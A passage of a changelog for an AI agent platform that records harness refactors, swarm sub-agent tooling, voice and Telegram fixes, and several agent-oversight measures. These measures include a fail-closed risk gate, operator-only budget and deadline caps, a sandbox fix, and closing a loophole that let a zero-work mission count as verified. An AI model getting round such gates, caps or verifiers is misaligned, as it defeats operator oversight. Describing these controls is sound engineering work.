  later tool call went to a stranger. It now asserts the health shape.
- OBJECTIVE — the post-mission reflection prompt asked for `obj.lastDirective`
  and never received one: nothing wrote the field. What a mission had to be
  corrected on is the most transferable thing its lesson carries.
- OBJECTIVE — `hasApiChecks` counted ANY entry in `obj.verify`, but
  `baselineArmChecks` arms a runtime check precisely BECAUSE it passed
  before any work happened. A zero-work natural stop with a green
  baseline-armed suite closed as `verdict:"verified"`, skipping the
  independent ground-truth verifier — a green suite is evidence of no
  REGRESSION, never of completion. The waiver now requires `source:"api"`.

## 3.179.2 (2026-08-25)

- file_equals tolerates exactly ONE trailing newline on the FILE side when
  the expected content does not end with one — every shell write (echo,
  heredoc) terminates files with \n, and that single byte held BOTH live
  proof missions at awaiting_human with otherwise-correct content
  (obj_mt8e2yrr, obj_mt8ernt8; hex-confirmed 0a). Content strictness is
  otherwise unchanged: an expected ending in newline stays fully strict,
  double newlines and any content drift still fail. \r\n accepted the
  same way. 2 new tests (7 cases).

## 3.179.1 (2026-08-25)

- COMPLETION FRICTION FIX (found live while proving W3, obj_mt8e2yrr): a
  mission whose deterministic api verify checks ALL PASS could still land
  awaiting_human when the model skipped the state block and answered in
  under 40 characters — the prose-length heuristic gated the deterministic
  gate itself. Checks now waive the heuristic on both natural-stop paths:
  ground truth beats prose length. Fail-closed unchanged — failing checks
  still directive/escalate exactly as before (regression-tested both ways).

## 3.179.0 (2026-08-25)

- W3 (30-day plan) — THE LEARNING WRITE-PATH, the last unstarted plan item:
  `src/memory/reflection.mjs` reflects over every finished mission with ONE
  tool-free model call and writes up to three typed "lesson" events
  (kind worked/failed/avoid, 200-char cap, provenance objectiveId+verdict)
  to durable workspace memory. Wired at the objective outcome boundary
  (persistOutcome), where the existing recall already feeds "lessons from
  past missions" into the NEXT mission's first segment — the loop is now
  closed: missions stop repeating their own mistakes.
- Contract: best-effort (a mission never fails on reflection), gated by
  memory.reflection (default on) and memory.enabled, objectives-only (no
  per-chat-turn cost), tolerant JSON extraction (fences/garbage → no writes).
- 5 tests: parse tolerance + caps, durable writes with provenance, both
  gates skip the provider entirely, failure/empty paths, wiring tripwire.

## 3.178.0 (2026-08-25)

- W2 STAGE 4d (the last stage-4 seam) — approval outcome staged:
  `planApprovalOutcome` in loop-stages.mjs is the pure verdict-to-action
  map (proceed / STOP-on-pending / deny-and-continue) with the pending
  record, user-visible reply, restate+timedOut state-update event, typed
  policy input, and loop-guard note; the gate call and side effects stay in
  the loop. 5 new tests (35 stage tests). Restate-dedupe tripwire
  re-anchored to the staged chain.
- Fixed in passing: the authorize options object carried a DUPLICATE
  `job:` key (identical value, second silently overrode the first).
- W2 "rewrite runAgentLoop into composable stages" now covers every
  decision surface the audit named: pre-flight budgets/segments, pairing
  invariant, stop-reason/terminal-status, rescue plan, call intake,
  allowlist verdict, TOCTOU gate, approval outcome — all pure, all fed real
  input shapes in tests.

## 3.177.5 (2026-08-25)

- W2 STAGE 4c — TOCTOU plan re-validation staged: `planToctouRevalidation`
  in loop-stages.mjs is the pure decision (applicability, pass event with
  fingerprint, deny plan with message/event/typed policy input/guard note);
  the loop injects `revalidatePlan` and applies the plan. 5 new tests
  (30 stage tests); plan-toctou e2e tripwire re-anchored to the new chain.

## 3.177.4 (2026-08-25)

- W2 STAGE 4b — run-scoped allowlist verdict pure (`evaluateRunAllowlist`
  in loop-stages.mjs): null when allowed, else the deny plan (message, event,
  trace policy) the loop applies. Defense-in-depth contract pinned by tests.

## 3.177.3 (2026-08-25)

- W2 STAGE 4a — processToolCall extraction begins: tool-call intake
  (JSON-args parse with malformed-JSON degrade-to-{} + workingDir cwd
  pinning for subagent/swarm isolates) is now pure
  (`parseToolCallArgs` in loop-stages.mjs). 2 new tests (24 stage tests).
  Remaining stage-4 seams (allowlist verdict, approval plan, TOCTOU check)
  per the session-state execution brief.

## 3.177.2 (2026-08-25)

- W2 STAGE 3 — final-answer rescue staged: `planFinalAnswerRescue` in
  `loop-stages.mjs` is the pure plan (enable flag, the no-tools rescue
  message with the orchestrated-segment rescuePrompt override, the
  best-effort stamp, the turn-cap stub); the loop keeps only the provider
  call. Behavior identical; 3 new tests (22 stage tests total).
- runAgentLoop staging status after stages 1-3: pre-flight detectors,
  pairing invariant, stop-reason/terminal-status chain, and rescue plan are
  pure and unit-pinned. Still inline: provider-call phase and the per-call
  security/dispatch pipeline (the next, largest extraction).

## 3.177.1 (2026-08-25)

- W2 STAGE 2 — two more verdict-critical blocks staged out of runAgentLoop
  into `loop-stages.mjs`, behavior identical:
  - `planPairingBackfill(calls, messages)` — the pairing invariant (every
    tool_call id gets a tool message; an orphan 400s the next Anthropic
    request) as a pure plan the loop applies.
  - `computeStopReason(flags)` + `terminalStatus(stopReason)` — the
    stop-cause priority chain (aborted > hook > guard > approval > policy >
    budget > maxTurns > natural) and the honest-terminal-state mapping
    ("completed" reserved for natural/hook; every cutoff persists AS its
    stopReason) — S2's completion-trust contract, now unit-pinned.
- 7 new tests: orphan detection in call order, id-less calls never
  backfilled, non-tool messages don't count as answered, every flag's
  mapping, multi-flag priority, cutoff-never-masquerades-as-completed.

## 3.177.0 (2026-08-25)

- W2 (30-day plan) STAGE 1 — runAgentLoop staging begins: the turn pre-flight
  decision logic (segment-boundary continuation, per-run cost governor,
  daily/job cost budgets, unattended-operation caps) extracted from the
  ~2,200-line loop closure into `src/agent/loop-stages.mjs`
  `evaluateTurnPreflight()` — a pure decision stage the loop composes.
  The stage COMPUTES (typed {segment, stop, events, strictError}); the loop
  PERFORMS (event emission, checkpointing, notice push, flag flips), so
  behavior is unchanged — including the exact check order (segment → governor
  → daily → job → run caps), fail-open ledger semantics, strict-mode rethrow
  AFTER the check_error event, and set-true-only flag application.
- 12 new unit tests feed the detectors the loop's real input shapes
  (boundary arithmetic, governor block/throw, daily hard/soft, job gating,
  strict vs lax ledger errors, graceful run-cap stop, ordering, segment-then-
  stop) — the audit's W2 acceptance ("loop detectors testable, fed real
  inputs") now holds for this stage.
- run-budget tripwire updated to assert the new wiring chain
  (loop → evaluateTurnPreflight({runBudget}) → check → event).

## 3.176.2 (2026-08-25)

- STRICT RELEASE GATE PASSES FOR THE FIRST TIME — the multi-night soak
  completed its contract: 3 distinct UTC nights (08-23/24/25), aggregate
  passRate 21/21 = 1.000 (gate >= 3 nights, >= 0.9), zero flakes, last night
  run on v3.176.1. Evidence recorded (soak.gate nightsOk+passOk in
  evidence-v3.176.1.json); the soak crontab removed per its own
  "remove after >= 3 green nights" contract. Two flaky cases remain
  quarantined (refactor-rename-greet, skill-ab-trap) with 0 greens —
  excluded from the gate per the quarantine contract, honestly recorded.
- Landed the last land-batch-n2 items the strict gate checks for (the batch
  had been half-landed): `xclaw stop --help` prints the kill-switch help
  (printStopHelp — the live kill-by-default semantics of bare `xclaw stop`
  are unchanged), and the release gate gained the `openapi-stop-dryrun` step
  (validates the OpenAPI /stop contract, required under --strict).
- Removed a verbatim duplicated land-batch-n1/n2 check pair in
  release-gate.mjs (the strict block ran both checks twice).

## 3.176.1 (2026-08-24)

- TELEGRAM CHANNEL HARDENING (live outage found minutes after the 3.176.0
  restart): a transient `getMe: Bad Gateway` at gateway boot killed the channel
  until the watchdog's next pass, and then the watchdog's recovery restart and
  a manual /channels/manage/restart interleaved — two concurrent poll loops
  terminated each other's getUpdates (CONFLICT every second) until a process
  restart. Three fixes, all evidence-driven from the gateway log:
  - `start()` retries retryable getMe failures (bounded, classified via
    classifyTelegramError — bad tokens still fail immediately) and is a no-op
    while a poll loop is alive or another start is in flight, so nothing can
    revive a loop that a concurrent stop() just flagged.
  - `createChannelManager` serializes start/stop/restart per channel — the
    watchdog tick and the manage route can no longer interleave.
  - Telegram API base is overridable at call time (XCLAW_TELEGRAM_API_BASE)
    for tests and self-hosted Bot API servers.
- New regression suite test/telegram-start-race.test.mjs (5 tests against a
  local mock Bot API: boot retry, fail-fast on 401, idempotent start, stop
  leaves no poller behind, concurrent restarts serialize to one poller).

## 3.176.0 (2026-08-24)

- COMPUTER ENGINE REVERSAL (ADR 0006, operator directive: the 16MB bundle is
  the one computer server; thin merged INTO it): `src/computer/xclaw-server.mjs`
  is now a tracked, hand-patched source file and the single engine;
  `src/computer/thin-server.mjs` is deleted — only after the full 50-gap thin-
  parity audit closed (operator's explicit gate).
- Every hand edit carries an `// A6: thin-server merge` marker (96 at ship).
  Merged-in thin behaviors, each live-probe-verified on a rig: env-policy
  strip-secrets + bwrap sandbox + spawn enforcement on bash; workspace
  confinement (E_SANDBOX) with cfg/env opt-outs; relaxed file guards;
  2MB file-read budget with per-call maxOutputBytes; browser lifecycle parity
  (adopt running Chrome, exit teardown incl. SIGHUP, stale SingletonLock
  clearing, CDP liveness re-probe, XCLAW_BROWSER_BIN, durable profile,
  stdio drain); SSRF floor on Page.navigate (metadata/file: blocked even with
  SSRF off); network-capture record parity (always-capture, inline headers/
  type/at/bytes, body preview, available-id hints); thin browser_tab verb
  vocabulary bridged to the native CDP modules; embeddable factory
  (createComputerServer, XCLAW_COMPUTER_EMBEDDED) + host/port binding;
  persist/detach background bash; camelCase/bare-name/`path` aliases;
  any-Content-Type JSON parsing; JSON 404 route directory; lenient create /
  idempotent destroy; nameless tools/call → 400; every tools/call result now
  stamped `metadata:{name, engine:"bundle"}` merged over the tool's own
  metadata.
- GAP 10 class closed for the browser plane: the gateway loop injects `cwd`
  into every tool call; browser_tab's strictObject schemas rejected the whole
  call (`unrecognized_keys`). Both schemas now declare-and-ignore
  cwd/workingDir (probe: all 7 tools tolerate the injected keys).
- Defects found and fixed during the parity audit: native `browser-cdp.mjs`
  awaited `assertUrlAllowed` but ignored its verdict — the CDP-navigate SSRF
  check was decorative (now throws SSRF_BLOCKED); enforced spawns lost all
  output to a sandbox-private tmpfs redirect (fd-inherit capture now).
- Deliberate skips, documented: bundle's 16-slot FIFO bash concurrency kept
  (thin was unbounded — worse); strict numeric validation kept (thin's silent
  garbage-coercion hid caller bugs). POST /call keeps the MCP-wrapped result
  shape as the documented contract (no in-repo caller of /call exists).
- Engine selection mirrors 3.175.0, reversed: resolveComputerEngine always
  "bundle"; legacy selectors (native/thin/generated/gen/c3,
  XCLAW_COMPUTER_NATIVE=1) resolve with a one-time notice.
  `scripts/ensure-computer.mjs` replaces `ensure-thin-computer.mjs` and
  adopts any healthy server on the port. Native browser stack
  (chrome-session/browser-cdp/modules) stays in-tree as the maintained
  library the bundle bridges to via loadNativeMergeModule.
- Docs realigned: COMPUTER_SOURCE_OF_TRUTH, README, INSTALL, LIVE_RUNBOOK,
  COMPUTER_USE_BACKEND, COMPUTER_EDITABLE_MODULES; NATIVE_ENGINE_PERF marked
  historical; ADR 0005 marked direction-superseded.

## 3.175.0 (2026-08-24)

- COMPUTER ENGINE UNIFICATION (ADR 0005, operator directive: "merge both
  into single without losing or wasting any function and dead code"): the
  native engine gains the full real-browser capability and the vendored
  16MB CDP bundle (`xclaw-server.mjs`) is retired — one engine, one spawn
  path, one policy answer.
- New `src/computer/chrome-session.mjs`: managed headless Chrome per
  computer-server process (lazy spawn with OS-assigned CDP port via
  DevToolsActivePort, adoption across server restarts, XCLAW_CDP_URL
  attach override, teardown on close, /health browser status).
- New `src/computer/modules/browser-cdp.mjs` + rewired `xclaw_browser_tab`:
  `render:true` real navigation, `jsCode` (Runtime.evaluate + console
  capture), full-PNG screenshots to disk with desktop/mobile device
  emulation (`screenshot: viewport|desktop|mobile|both`), `action=console`,
  live Network.* capture feeding `xclaw_browser_network_details`, click/type
  actuation. `src/browser/cdp-client.mjs` gained CDP event subscription
  (`on()`); previously all event frames were dropped.
- `xclaw_computer_act` works out of the box: falls back to the managed
  Chrome when no XCLAW_CDP_URL is attached; screenshots now written to disk
  as full PNG (`~/.xclaw/screenshots/`) instead of truncated base64.
  Retired codes CUA_ACT_REQUIRES_BUNDLE / CUA_ACT_NOT_EXTRACTED →
  CUA_BROWSER_UNAVAILABLE (no Chrome binary on host).
- Phase A enforcement now runs engine-side in `runBrowserTab`
  (beforeNavigate commit/role gates, beforeInput jsCode motor-pattern
  policy) — parity with the in-process enforcement the bundle got via its
  env bridges.
- Deleted: bundle entry + hooks/motor/chrome-args bridges + bundle metadata
  JSONs + fetch/publish/verify/bench scripts + npm bundle scripts + engine
  selection branches + BUNDLE_ONLY_REGIONS + the computerAcceptsCwd/RunPlan
  schema probes and router strip branches (native always accepts both).
  Legacy selectors (engine:"bundle"/"full", XCLAW_COMPUTER_NATIVE=0,
  "generated") resolve to native with a one-time notice. The last published
  bundle stays archived on GitHub release `computer-bundle` (sha256
  9d95d067…, verified byte-identical before deletion).

## 3.174.1 (2026-08-24)

- python_session advertised in the `act` and `browse` role packs — the lab
  profile's `agent.toolPack:"act"` had filtered the tool out of the
  advertised set (risk gate unchanged; membership only controls
  advertisement).

## 3.174.0 (2026-08-24)

- STATEFUL PYTHON: `python_session` agent tool on a per-session Jupyter
  kernel pool (`src/swarm/runtime/python/kernel_pool_server.py`, loopback
  127.0.0.1:18799, LRU 6 kernels, 30-min idle reap) over the extension
  zip's `jupyter_kernel.py` ZMQ execute protocol. Variables/dataframes
  persist across calls per session; matplotlib figures land in the
  workspace as PNG paths. Risk: exec-family → risky, credential-touching
  code → critical, swarm bridge denies at default tier. Advertised only
  when the kernel venv (/opt/xclaw-kernel/venv) exists.

## 3.173.0 (2026-08-24)

- SWARM UNIFICATION (ADR 0004, operator directive: "merge both"): the
  isolated swarm-ext module is absorbed into core as `src/swarm/` — one
  subsystem, two strategies (native ensemble /swarm/run unchanged;
  decompose engine now at /swarm/goals + /swarm/tasks/:id +
  /swarm/decompose/*; legacy /api/swarm aliases kept).
- Zero external dependencies restored: redis-backed TaskQueue/MemoryStore
  reimplemented in-process behind identical interfaces; express layer
  replaced by a native gateway route (auth inherited); zod was dead code.
  `npm install --prefix src/swarm-ext` and redis are no longer needed.
- Config: swarm.decompose.* (legacy swarmExt.* honored). Engine tests moved
  into the MAIN suite (were vendor-local, invisible to CI).
- Dead vendor code deleted (fake /batch that fabricated task ids, stub
  /receipts, unwired mcp chain, duplicate heartbeat, redis/zod carriers).
  The formerly-dead ToolPolicy engine was WIRED LIVE instead: optional
  egress policy in the tool bridge (swarm.decompose.tools.policy — tool
  block/allowlists, egress deny, SSRF-safe URL host allowlist).

## 3.172.0 (2026-08-24)

- gateway (30-day plan W2): route extraction finished — voice (4 routes),
  oauth-callback, artifacts (3), approvals+agent-runs (4), and /agent/run
  (JSON + SSE entry) moved from the index.mjs monolith into ./routes/*
  modules at identical dispatch positions (closure collaborators
  runAgentLoop/noteEviction/streamAgentRun/approvalGate passed as args;
  behavior byte-preserved). index.mjs 1876 -> 1638 lines; dead imports
  removed. Still inline by design: /v1, eviction SSE, native /swarm
  (stop-proxy), telegram webhook + webchat streamers, static serving.
  Live-verified on an isolated gateway: all 5 groups incl. a real
  /agent/run round-trip.

## 3.171.0 (2026-08-24)

- voice: TTS no longer vocalizes markup — new toSpeakableText sanitizer
  (src/voice/speakable.mjs) converts replies to natural speech before every
  synthesis: bullets/headings become sentences, code blocks say "Code
  omitted", URLs collapse to their hostname, links speak their label,
  emphasis/parens/pipes/emoji dropped, sentence punctuation KEPT for
  prosody, maxChars cuts at a sentence boundary instead of mid-word.
  Wired at every reply-speaking surface: Telegram voice notes, the
  streaming sentence speaker, voice WS, TUI voice session, and the
  personal-assistant agent. Verbatim paths (audio_generation plugin) are
  deliberately untouched.

## 3.170.0 (2026-08-24)

Four defects observed live in the owner's Telegram DM session, all fixed:

- FIX claims-JSON leak (REGRESSION): run-agent preferred the loop's raw
  finalText (kept for claims-gate scoring) and passed it outward — Telegram
  replies and voice captions showed the internal ```json {"claims":…}```
  scaffold. Now: gate scores raw, channels get stripped presentation text
  (splitScoreAndPresentationText, unit-tested).
- Telegram markdown rendering: replies now sent parse_mode HTML via a
  bounded md→HTML converter (bold/italic/code/fences/http-links, entity
  escaping, plain-text fallback on rejection); streamer's final edit too.
  Voice captions use mdToPlain instead of raw asterisks.
- Photo delivery: image artifacts that are URLs (e.g. protocol-relative
  weather icons) are sent via sendPhoto-by-URL instead of being read as
  local file paths (was ENOENT, photos silently dropped).
- Media downloads (voice notes, photos, documents) retry 3x with backoff —
  a single transient fetch failure was eating whole voice notes.

## 3.169.0 (2026-08-24)

- voice: Kokoro-82M neural TTS integrated into localSpeak as the preferred
  local engine (cfg voice.kokoroBin/voice.kokoroVoice, piper's CLI shape,
  falls through kokoro -> piper -> espeak-ng). Runtime at /opt/kokoro
  (onnx model + speak.py wrapper), ~5x realtime on 4 CPU cores.
- voice FIX: a TTS binary exiting before reading stdin crashed the gateway
  with an uncaught EPIPE (stdin error handler added in run()) — found by the
  new hermetic fallback tests (test/voice-kokoro.test.mjs, fake CLI bins).

## 3.168.1 (2026-08-24)

- swarm-ext: vendor `tts` stub plugin removed — it fabricated audio URLs and
  sat next to the real `audio_generation` tool (same class of removal as the
  image-generate stub in 3.167.0). Capability strictly upgraded, not dropped.

## 3.168.0 (2026-08-24)

- swarm-ext: `audio_generation` plugin landed REAL — local TTS via xclaw's
  own voice pipeline (`localSpeak`): piper neural voice (installed at
  /opt/piper, en_US-lessac-medium, ~20x realtime on CPU) with espeak-ng
  fallback; WAV output into the swarm workspace. No cloud APIs, no keys.
  TTS is now gateway-wide — previously reachable only from Telegram/webchat
  voice paths. Live config gains voice.piperBin/voice.piperModel (flat keys).

## 3.167.0 (2026-08-24)

- swarm-ext: 5 REAL data plugins replace the stub drop from the operator's
  "complete-final" zip (which returned fabricated Math.random data):
  `yahoo_finance` (Yahoo chart API — quotes/history/dividends),
  `sec_edgar` (SEC data.sec.gov filings + key XBRL facts, ticker or CIK),
  `world_bank` (Open Data v2 + indicator shortcuts),
  `imf` (DataMapper WEO incl. projections; API ignores its own country/period
  filters, so filtering is client-side),
  `scholar` (Semantic Scholar with automatic OpenAlex fallback on 429).
- swarm-ext: shared plugin HTTP helper (`plugins-lib/http.mjs`) — URL-free UA
  (SEC WAF rejects UAs containing URLs), one 429/503 retry honoring
  Retry-After, injectable fetch so CI is network-free.
- swarm-ext: real `generate_image` (xAI images API) exposed to sub-agents via
  the tool bridge; the vendor `image-generate` stub (fabricated URLs) removed.
  The `audio-generation` stub was NOT landed — no real TTS backend exists.
- sec-edgar SCAFFOLD: built-in top-50 ticker→CIK fallback for hosts where
  www.sec.gov (index file) is IP-blocked while data.sec.gov is reachable.

## 3.166.0 — swarm-ext: sub-agents wired to xclaw's REAL tool router (2026-08-24)

- **New `src/swarm-ext/tool-bridge.mjs`** — implements the vendor ToolRegistry interface (`getSchemas`/`execute`) over xclaw's actual tool planes via `createToolRouter`: computer (`xclaw_bash`, `xclaw_file_read/write/edit/list`), local (`glob`, `grep`, `file_type`, `markitdown`), and research (`web_search`, `web_fetch`). Curated `DEFAULT_ALLOW` exposure (∩ actually-advertised), operator-narrowable via `swarmExt.tools.allow`. Merged registry: real tools WIN name collisions (the real `web_search` replaces the vendor stub), vendor plugins fill gaps; bridge failure degrades loudly to vendor-only instead of failing the mount.
- **Fail-closed risk gate** — autonomous sub-agents can never pend for approval, so every call runs xclaw's `assessRisk` first: tier ≤ `swarmExt.tools.autoApproveMaxTier` (default `low` = reads + provably read-only exec + workspace writes) auto-runs; `risky`/`critical` (egress exec, outside-workspace writes, irreversible commands) are DENIED with a typed error the sub-agent sees. `web_search`/`web_fetch` are name-allowlisted research primitives (`alwaysAllow`) since the egress name-family would tier them risky. Exec cwd pinned to a dedicated `~/.xclaw/workspaces/swarm-ext` workspace (the loop's authArgs pattern).
- **Strict-engine probe** — first live drive failed with `InputValidationError: Unrecognized key(s): 'cwd'`: the frozen C4 bundle's zod schemas reject unknown keys. The bridge now probes `xclaw_bash`'s advertised schema and passes `computerAcceptsCwd`/`computerAcceptsRunPlan` to the router (the same probe the agent loop runs), which strips the injected keys before forwarding.
- **Live-proven on the real gateway**: goal "kernel version + node version + os-release PRETTY_NAME in parallel" → 3 parallel coder sub-agents each made REAL `xclaw_bash` calls → `6.8.0-90-generic`, `v22.22.3`, `Ubuntu 24.04.4 LTS` → writer join + LLM merge, done 4 agents/2 groups/60.6s. Bridge mount log: "10 real tools, vendor fills gaps" (18 advertised total).
- **Tests**: new `test/swarm-ext-tool-bridge.test.mjs` (10, CI-safe — fake computer/local/router collaborators, REAL `assessRisk`/`tierRank`/`createToolRouter`): allowlist filtering both planes, read-only exec passes + cwd pin, risky exec denied before dispatch, irreversible denied, alwaysAllow bypass, unknown-name refusal, operator tier raise, strict-engine cwd strip through the real router, merged-registry precedence. Live risk-gate DENY is unit-proven (no destructive live attempt).

## 3.165.1 — swarm-ext: multi-agent path actually works — DAG sort + dependency-result passing (2026-08-24)

- **Enabled live and driven end-to-end multi-agent.** `swarmExt.enabled:true` on the live gateway; goal "3 calculations in parallel, then combine" → 4 sub-agents in 2 groups (parallelRatio 0.75): three analysts each made a REAL `calculate` tool call (341*7=2387, 2^10=1024, 99+877=976) and the writer join agent produced `a=2387, b=1024, c=976`, confidence 1.0, 58.6s. The 3.165.0 E2E was single-agent and could not see these defects.
- **topologicalSort computed in-degrees backwards** (incremented each dependency's counter instead of the dependent's) — ANY plan containing a dependency edge sorted incomplete, `buildExecutionGroups` returned null, and the orchestrator crashed on `null.length` (reproduced live on the first multi-agent goal). In-degree is now each node's own known-dependency count; unknown (hallucinated) dep ids are ignored in both the sort and the group builder so a phantom dependency can no longer stall a plan; duplicate queueing guarded; orchestrator now throws a typed "unresolvable dependency graph" instead of the opaque crash.
- **Dependent agents now SEE their dependencies' results.** The join/format agent used to receive nothing from upstream tasks and answered "a=unavailable..." — the orchestrator now injects `dependencyResults` (role, description, content ≤4KB per dep) into each dependent task's context, which `formatSubAgentPrompt` already serializes into the agent's user message.
- **Security-review hardening (71127a3, same day):** tool-policy URL allowlist exact-host/dot-suffix matching (vendored substring `hostname.includes()` allowed `allowed.com.attacker.io`), NOT-WIRED warning header on the unmounted WS route, security-posture section in the module README (operator-token surface, randomUUID ids, ToolPolicy wiring status).
- **Tests:** new vendor `test/swarm/dag-engine.test.mjs` (5: fan-in sort, dependency-honoring groups, diamond, phantom-dep regression, cycle-break fallback) — vendor suite 15/15.

## 3.165.0 — swarm-ext: vendored swarm extension as an isolated opt-in module (2026-08-24)

- **New `src/swarm-ext/` module (OFF by default)** — the operator-delivered `xclaw-swarm-extension-xclaw-branded.zip` (104 files) landed as a self-contained second swarm engine: LLM goal decomposition → DAG cycle-breaking → parallel sub-agent pool → merge policy (llm/vote/quorum/concat) → execution receipt → PARL reward sample. Mounted at `/api/swarm/*` ONLY when `swarmExt.enabled: true`; with the flag off (default) the gateway is byte-identical in behavior and the module is never imported (`/api/swarm` answers 404 `SWARM_EXT_DISABLED`). ADR 0003; ADR 0002 preserved — the native swarm (`src/agents/swarm-*`, `/swarm/*`) is untouched.
- **Zero-dep core preserved.** Root `package.json` still declares no dependencies. The extension's real deps — `express`, `ioredis`, `zod` (the zip declared 11 but only 4 were ever imported, and `node-fetch` was removed, see below) — install isolated via `npm install --prefix src/swarm-ext`. Missing deps or redis while enabled → `/api/swarm` answers 503 with a hint, gateway unharmed.
- **Integration glue (new, dependency-free):** `src/swarm-ext/llm-adapter.mjs` maps the vendor `llm.chat(messages,{tools})` / `llm.structuredOutput(messages,schema)` interface onto xclaw's `createProvider` + provider routing (fence-stripping JSON extraction, one parse retry, zod-validation retry); `src/swarm-ext/mount.mjs` builds the express app once (config pinned to the subtree, telemetry server force-disabled — vendor metrics would bind :9090 — models routed through xclaw's configured provider, PARL export under `.xclaw/swarm-ext/`). `/api/swarm` is operator-token protected in BOTH auth modes.
- **Six real vendor defects found and fixed during integration** (each would have broken every run): (1) 8 files had literal newlines inside string/regex literals — the whole `src/swarm` graph failed to parse (24 repaired sites, all `\n` join/split/regex semantics, verified by diff); (2) `import { fetch } from "node-fetch"` in 5 plugin tools — node-fetch v3 has no named `fetch` export, would be `undefined` at call time (removed; Node ≥22 global fetch); (3) POST `/goals` returned a freshly generated taskId DIFFERENT from the id `submit()` registered — polling the returned id 404'd forever (id now pre-generated and threaded through); (4) orchestrator destructured `{resolved, changes}` from `detectAndBreakCycles` which returns `{hasCycle, tasks, breakingEdges}` — `changes.length` threw on EVERY submission; (5) vendor `loadPlugins()` returns an array but sub-agents need the `PluginRegistry` interface (`getSchemas`/`execute`) — mount now builds the registry (9 plugins/9 tools load); (6) `BudgetTracker` ignored its documented `enabled`/`alertThreshold` constructor options and lacked the `onAlert` hook + `totalTokens` summary field its own shipped tests assert.
- **Config honesty:** vendored `xclaw-swarm.json` tuned — `maxSubAgents 300→25`, `maxConcurrent 300→8`, `telemetry.enabled→false`, `sandbox.enabled→false` (the shipped BashTool spawns plain `bash -c`; the docker sandbox is config-only), literal redis URLs (the `${REDIS_URL}` placeholders pass through VERBATIM when the env var is unset, handing ioredis a garbage URL). Known vendor stubs (web-search/tts/browser/code-executor/image-generate/web-extract tools, screen OCR) shipped as delivered and documented in `src/swarm-ext/README.md`; WS progress route not wired (REST polling covers it).
- **Live-proven end-to-end** on a real gateway instance: flag-off → `/api/swarm/health` 404 + native `/swarm` 200; flag-on → health `{redis:true, plugins:true}` with 9 tools on grok-4.6; `POST /api/swarm/goals` ("Compute 17*23") → LLM plan with reasoning → 1 analyst sub-agent → real `calculate` tool call → answer 391 → LLM merge → full receipt, status `done` 1/1 in 32s.
- **Tests:** new `test/swarm-ext.test.mjs` (12, CI-safe: no extension deps needed — flag default, auth/gating source assertions, zero-dep core, adapter chat/structuredOutput mapping incl. malformed-args + retry paths, extractJson). Vendor suite `npm test --prefix src/swarm-ext` 10/10 after the BudgetTracker fix.

## 3.164.0 — bwrap sandbox: fix merged-/usr probe that silently disabled it (W4c) (2026-08-24)

- **The OS sandbox now actually engages on modern Linux.** On merged-`/usr` hosts (Debian/Ubuntu/Arch/Fedora, where `/bin`,`/sbin`,`/lib`,`/lib64` are symlinks into `/usr`), the bwrap *usability probes* bound only `/usr` into the sandbox namespace and then tried to run `/bin/true`. The dynamic loader (`/lib64/ld-linux-x86-64.so.2`) was unreachable, so the probe failed with `execvp /bin/true: No such file or directory`, `probeBwrapWorks()` cached `false`, and `wrapSpawnWithOsSandbox` fell back **unsandboxed in auto mode / denied in forced mode** — even though the real `buildBwrapArgv` builder binds all the lib dirs and works fine. A test-green/production-dead defect: the probe and the builder had diverged.
- **Single-sourced the RO-bind list.** New exported `roBindDirsArgv(cfg)` returns the standard system-dir `--ro-bind` pairs (`/usr /etc /bin /sbin /lib /lib64 /lib32` + `security.osSandboxExtraRo`, existence-guarded and realpath-deduped). Both probes (`probeBwrapWorks`, `probeBwrapNetns`) and the real builder (`buildBwrapArgv`) now call it, so a probe can never again pass or fail on a different filesystem view than the sandbox it is vouching for. Net −44 lines (removed two hand-rolled copies).
- **Tests**: the three previously-self-skipping cases in `test/os-sandbox-bwrap-live.test.mjs` ("executeBash reports osSandboxed under bwrap", "argv includes unshare-net when explicitly requested", "when bwrap usable, wraps with `--` flags") now **run and pass** — no longer gated behind a `bwrap unusable` skip. Full suite 2855/0 (0 skipped, was 5). Live-verified on this merged-/usr host: bwrap 0.9.0, `/bin -> usr/bin`, sandboxed `/bin/true` exits 0.
## 3.163.0 — objective guardrails: deadline + budget + assumptions/planVersion (W3a) (2026-08-24)

- **Operator-set wall-clock and spend limits on long-run missions.** A mission can now carry a `deadline` (ISO) and a `budget` (`maxUsd` / `maxToolCalls`). The orchestrator checks them BETWEEN segments — the same boundary as the existing `maxSegments` cap — and transitions to `paused_budget` with a typed reason (`deadline` / `maxToolCalls` / `maxUsd`) the moment one is crossed. Progress is preserved; the mission is resumable. A model cannot widen its own limits: raising a cap is an explicit operator `resume` with a new value.
- **Per-segment cost is now accounted.** `obj.totals.costUsd` accumulates each segment's real provider cost when billed, else an estimate from token usage via the daily governor's `estimateUsdFromUsage` path — so `maxUsd` works on OAuth providers that report no cost.
- **Richer durable state.** `assumptions[]` records the working assumptions a mission proceeds on instead of stopping to ask (INTAKE doctrine) and surfaces them in every continuation prompt; `planVersion` is an audit trail that bumps only when the committed plan actually changes (re-emitting the same plan is a no-op) and appears in the segment prompt's Plan header.
- **Operator surface, both paths.** Chat: `/objective <goal> --deadline <ISO|+2h|+30m|+1d> --max-usd <n> --max-tools <n>`, and `/objective resume <id> --max-tools <n>` (etc.) to raise a cap past a pause. HTTP: `POST /objectives` and `POST /objectives/:id/resume` accept `{deadline, budget}` in the body. Flags are stripped from the goal text before it reaches the model.
- **Tests**: new `test/objective-guardrails.test.mjs` (10) — assumptions union + prompt surfacing, planVersion bump/no-op + Plan header, `checkObjectiveGuardrails` typed predicate, deadline pause before segment 0, tool-call pause after the crossing segment, spend pause on accumulated cost, resume-with-raised-cap runs to completion, and `parseObjectiveFlags` (relative/ISO deadline, partial budget). Full suite 2850/0 (5 skipped). Live-driven on the gateway: a `--deadline 2000-01-01` mission paused at segment 0 with ledger `reason:"deadline"`; an HTTP resume with a new deadline mutated the durable limit on the live path.
## 3.162.0 — loop guard: hallucinated-tool typed stop (W2b) (2026-08-24)

- **A model that invents a tool that does not exist is now stopped fast and typed.** When the agent calls a tool name the router cannot route, the router rejects it ("Unknown tool" / "No adapter" / "No agent handler"); `src/agent/loop.mjs` now feeds that rejection to the loop guard's unknown-tool detector, so the same fabricated name repeated 10× trips a CRITICAL `unknown_tool_repeat` soft-stop instead of grinding on to the generic no-progress breaker (~20-30 identical calls).
